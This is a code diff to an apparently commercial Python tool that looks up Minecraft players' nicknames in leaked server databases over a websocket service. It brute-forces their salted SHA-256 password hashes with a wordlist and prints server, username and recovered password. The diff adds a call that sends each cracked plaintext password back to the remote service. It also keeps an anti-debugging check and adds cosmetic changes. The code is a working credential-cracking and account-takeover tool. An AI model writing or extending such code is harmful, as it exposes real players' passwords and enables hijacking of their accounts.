@@ -42,12 +42,16 @@ async def ws_mcsearch(uri, user, passwd, nickname):
         await ws.send(f"MCSEARCH {user} {passwd} {nickname}")
         return await ws.recv()
 
+async def ws_addpass(uri, user, passwd, hash, userpass):
+    async with connect(uri) as ws:
+        await ws.send(f"ADDPASS {user} {passwd} {hash} {userpass}")
+
 # UTILITIES
 
 def printcenter(s):
-    a = shutil.get_terminal_size()
+    tsize = shutil.get_terminal_size()
     for line in s.split("\n"):
-        print(line.center(a.columns))
+        print(line.center(tsize.columns))
 
 def centertext(s):
     a = shutil.get_terminal_size()
@@ -63,7 +67,9 @@ def bruteforce(hash, salt):
             withsalt = hashlib.sha256(nosalt.encode() + salt.encode()).hexdigest()
             if withsalt == hash:
                 return word
-    return False
+    if len(hash) == 128: # SHA512 - DBA
+        return
+    return hash
 
 def antidebug():
         procesos = [
@@ -114,7 +120,7 @@ def d_mc():
 ║ Loading wordlist... Please wait.  ║
 ║                                   ║
 ╚═══════════════════════════════════╝""")
-        with open(wordlist, 'r') as f:
+        with open(wordlist, 'r', encoding="latin-1") as f:
             lines = f.readlines()
             for line in lines:
                 line = line.replace('\n', '')
@@ -132,20 +138,23 @@ def d_mc():
             for line in dbdata:
                 if not (line == ""):
                     server = line.split(" ")[0]
+                    line = line.replace("'", '"')
                     results = []
                     print(Fore.RED)
-                    printcenter(f"Found {nick}@{server}. Cracking...{Fore.GREEN}")
+                    printcenter(f"Found {nick}@{server}. Cracking...")
+                    print(Fore.GREEN)
                     hash = json.loads(line.replace(server+" ", ""))['password']
                     realpass = bruteforce(hash.replace('\n', ''), "Salt with hash")
-                    if not (realpass == False):
+                    if not (realpass == hash.replace('\n', '')):
                         printcenter("» Server: "+server)
                         printcenter("» Username: "+nick)
                         printcenter("» Password: "+realpass)
+                        asyncio.run(ws_addpass(ws, user, pwd, hash, realpass))
                         results.append(f"{server};{realpass}")
                     else:
                         printcenter("» Server: "+server)
                         printcenter("» Username: "+nick)
-                        printcenter("» Password: Not found. ("+hash+")")
+                        printcenter("» Password: "+realpass)
             print(Fore.RED)
             printcenter("Finished searching data.")
             save = input("Do you want to save the results? ")
@@ -178,16 +187,21 @@ def main():
     for a in data:
         a = a.replace('\n', '').split()
         if a[0] == "RANK":
-            rank = a[1]
-            if a[1].lower() == "admin":
-                rankprefix += f"{Fore.RED}[{Fore.LIGHTRED_EX}ADMIN{Fore.RED}]"
+            rankinfo = a[1].lower().split('-')
+            rank = rankinfo[0]
+            if rankinfo[1] == "extended":
+                rankprefix += f" {Fore.CYAN}[EXTENDED]"
+            if rank == "admin":
+                rankprefix += f" {Fore.RED}[{Fore.LIGHTRED_EX}ADMIN{Fore.RED}]"
+            if rank == "staff":
+                rankprefix += f" {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}STAFF{Fore.YELLOW}]"
         elif a[0] == "TIMELEFT":
             timeleft = a[1]
     # GET DATA
     print()
     printcenter(Fore.RED+logo2)
     print()
-    print(f"                                       {Fore.LIGHTBLUE_EX}Welcome back {rankprefix} {user}, {Fore.LIGHTBLUE_EX}you got {Fore.BLUE}{timeleft}{Fore.LIGHTBLUE_EX} days left.")
+    print(f"                                       {Fore.LIGHTBLUE_EX}Welcome back{rankprefix} {user}, {Fore.LIGHTBLUE_EX}you got {Fore.BLUE}{timeleft}{Fore.LIGHTBLUE_EX} days left.")
     print()
     printcenter(f"{Fore.BLUE}1) {Fore.CYAN}Minecraft Searcher")
     printcenter(f"{Fore.BLUE}2) {Fore.CYAN}Settings")
@@ -211,8 +225,8 @@ def main():
 
 antidebug()
 os.system("cls || clear")
-print()
-printcenter(Fore.RED+logo)
+print(Fore.RED)
+printcenter(logo)
 printcenter("Insert your credentials.")
 print()
 print(f"{Fore.RED}[»] {Fore.LIGHTBLUE_EX}Insert your username: {Fore.RESET}", end="")
